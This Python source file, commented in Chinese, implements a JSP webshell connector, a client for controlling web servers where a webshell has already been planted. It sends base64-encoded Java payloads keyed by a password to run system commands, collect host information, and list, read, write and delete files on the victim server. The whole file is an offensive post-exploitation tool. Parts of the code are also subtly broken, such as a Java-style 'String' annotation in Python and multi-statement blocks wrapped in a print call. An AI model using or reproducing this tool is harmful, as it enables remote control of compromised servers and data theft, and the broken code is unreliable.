"""
JSP Webshell连接器模块
基于20年渗透测试经验的专业级JSP Webshell连接器
支持命令执行、文件操作、数据库操作等功能
"""

import httpx
import base64
import logging
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
import urllib.parse

logger = logging.getLogger(__name__)


@dataclass
class JSPWebshellConnection:
    """JSP Webshell连接信息"""
    id: str
    url: str
    password: str
    method: str = 'POST'
    status: str = 'unknown'
    last_connect: Optional[datetime] = None
    os_type: Optional[str] = None
    server_info: Optional[str] = None
    java_version: Optional[str] = None
    current_user: Optional[str] = None
    current_dir: Optional[str] = None
    tags: List[str] = None
    
    def __post_init__(self):
        if self.tags is None:
            self.tags = []


class JSPConnector:
    """专业级JSP Webshell连接器"""
    
    def __init__(self):
        self.connections: Dict[str, JSPWebshellConnection] = {}
        self.timeout: int = 30
        self.verify_ssl: bool = False
        self.follow_redirects: bool = True
        
        logger.info("专业级JSP Webshell连接器初始化完成")
    
    def add_connection(self, url: str, password: str, method: str = 'POST') -> str:
        """添加JSP Webshell连接"""
        import uuid
        conn_id = str(uuid.uuid4())
        
        connection = JSPWebshellConnection(
            id=conn_id,
            url=url,
            password=password,
            method=method,
            status='unknown'
        )
        
        self.connections[conn_id] = connection
        logger.info(f"添加JSP Webshell连接: {url}")
        return conn_id
    
    async def test_connection(self, conn_id: str) -> Tuple[bool, str]:
        """测试连接"""
        if conn_id not in self.connections:
            return False, "连接不存在"
        
        conn = self.connections[conn_id]
        
        try:
            result = await self.execute_command(conn_id, 'echo "JSP_CONN_OK"')
            
            if result.success and 'JSP_CONN_OK' in result.output:
                await self._gather_system_info(conn_id)
                conn.status = 'online'
                conn.last_connect = datetime.now()
                logger.info(f"JSP连接测试成功: {conn.url}")
                return True, "连接成功"
            else:
                conn.status = 'offline'
                return False, "连接失败"
                
        except Exception as e:
            conn.status = 'offline'
            logger.error(f"JSP连接测试失败: {e}")
            return False, str(e)
    
    async def _gather_system_info(self, conn_id: str):
        """收集系统信息"""
        conn = self.connections[conn_id]
        
        try:
            os_cmd = 'System.getProperty("os.name")'
            os_result = await self.execute_java_code(conn_id, os_cmd)
            if os_result.success:
                conn.os_type = os_result.output.strip()
            
            user_cmd = 'System.getProperty("user.name")'
            user_result = await self.execute_java_code(conn_id, user_cmd)
            if user_result.success:
                conn.current_user = user_result.output.strip()
            
            dir_cmd = 'System.getProperty("user.dir")'
            dir_result = await self.execute_java_code(conn_id, dir_cmd)
            if dir_result.success:
                conn.current_dir = dir_result.output.strip()
            
            version_cmd = 'System.getProperty("java.version")'
            version_result = await self.execute_java_code(conn_id, version_cmd)
            if version_result.success:
                conn.java_version = version_result.output.strip()
            
        except Exception as e:
            logger.error(f"收集JSP系统信息失败: {e}")
    
    async def execute_command(self, conn_id: str, command: str) -> Any:
        """执行系统命令"""
        if conn_id not in self.connections:
            return type('obj', (object,), {'success': False, 'output': '', 'error': '连接不存在'})
        
        conn = self.connections[conn_id]
        
        jsp_code = self._generate_command_exec_code(command)
        
        try:
            response = await self._send_request(conn, jsp_code)
            return type('obj', (object,), {'success': True, 'output': response})
        except Exception as e:
            return type('obj', (object,), {'success': False, 'output': '', 'error': str(e)})
    
    async def execute_java_code(self, conn_id: str, java_code: str) -> Any:
        """执行Java代码片段"""
        if conn_id not in self.connections:
            return type('obj', (object,), {'success': False, 'output': '', 'error': '连接不存在'})
        
        conn = self.connections[conn_id]
        
        full_code = self._wrap_java_code(java_code)
        
        try:
            response = await self._send_request(conn, full_code)
            return type('obj', (object,), {'success': True, 'output': response})
        except Exception as e:
            return type('obj', (object,), {'success': False, 'output': '', 'error': str(e)})
    
    def _generate_command_exec_code(self, command: str) -> str:
        """生成命令执行JSP代码"""
        return f'''
Process p = Runtime.getRuntime().exec("{command}");
java.io.InputStream in = p.getInputStream();
java.io.InputStream err = p.getErrorStream();
java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
byte[] buffer = new byte[1024];
int len;
while ((len = in.read(buffer)) != -1) {{
    baos.write(buffer, 0, len);
}}
while ((len = err.read(buffer)) != -1) {{
    baos.write(buffer, 0, len);
}}
out.print(baos.toString("UTF-8"));
'''
    
    def _wrap_java_code(self, java_code: String) -> String:
        """包装Java代码"""
        return f'out.print({java_code});'
    
    async def _send_request(self, conn: JSPWebshellConnection, payload: str) -> str:
        """发送请求"""
        encoded_payload = base64.b64encode(payload.encode()).decode()
        
        async with httpx.AsyncClient(
            timeout=self.timeout,
            verify=self.verify_ssl,
            follow_redirects=self.follow_redirects
        ) as client:
            if conn.method == 'POST':
                response = await client.post(
                    conn.url,
                    data={conn.password: encoded_payload}
                )
            elif conn.method == 'GET':
                url = f"{conn.url}?{conn.password}={urllib.parse.quote(encoded_payload)}"
                response = await client.get(url)
            else:
                raise ValueError(f"不支持的方法: {conn.method}")
            
            return response.text
    
    async def list_directory(self, conn_id: str, path: str = '.') -> List[Dict]:
        """列出目录"""
        java_code = f'''
java.io.File dir = new java.io.File("{path}");
if(dir.isDirectory()) {{
    java.io.File[] files = dir.listFiles();
    java.util.List list = new java.util.ArrayList();
    if(files != null) {{
        for(java.io.File f : files) {{
            java.util.Map info = new java.util.HashMap();
            info.put("name", f.getName());
            info.put("path", f.getAbsolutePath());
            info.put("size", f.length());
            info.put("is_dir", f.isDirectory());
            info.put("mtime", new java.util.Date(f.lastModified()).toString());
            list.add(info);
        }}
    }}
    out.print(new com.google.gson.Gson().toJson(list));
}}
'''
        
        result = await self.execute_java_code(conn_id, java_code)
        if not result.success:
            return []
        
        import json
        try:
            return json.loads(result.output)
        except:
            return []
    
    async def read_file(self, conn_id: str, filepath: str) -> Optional[str]:
        """读取文件"""
        java_code = f'''
java.io.File f = new java.io.File("{filepath}");
java.io.FileInputStream fis = new java.io.FileInputStream(f);
java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
byte[] buffer = new byte[8192];
int len;
while((len = fis.read(buffer)) != -1) {{
    baos.write(buffer, 0, len);
}}
fis.close();
out.print(baos.toString("UTF-8"));
'''
        
        result = await self.execute_java_code(conn_id, java_code)
        return result.output if result.success else None
    
    async def write_file(self, conn_id: str, filepath: str, content: str) -> bool:
        """写入文件"""
        encoded_content = base64.b64encode(content.encode()).decode()
        java_code = f'''
byte[] content = java.util.Base64.getDecoder().decode("{encoded_content}");
java.io.FileOutputStream fos = new java.io.FileOutputStream("{filepath}");
fos.write(content);
fos.close();
out.print("OK");
'''
        
        result = await self.execute_java_code(conn_id, java_code)
        return result.success and 'OK' in result.output
    
    async def delete_file(self, conn_id: str, filepath: str) -> bool:
        """删除文件"""
        java_code = f'''
java.io.File f = new java.io.File("{filepath}");
out.print(f.delete() ? "OK" : "ERROR");
'''
        
        result = await self.execute_java_code(conn_id, java_code)
        return result.success and 'OK' in result.output
    
    def get_connection(self, conn_id: str) -> Optional[JSPWebshellConnection]:
        """获取连接"""
        return self.connections.get(conn_id)
    
    def get_all_connections(self) -> List[JSPWebshellConnection]:
        """获取所有连接"""
        return list(self.connections.values())
    
    def remove_connection(self, conn_id: str) -> bool:
        """移除连接"""
        if conn_id in self.connections:
            del self.connections[conn_id]
            return True
        return False
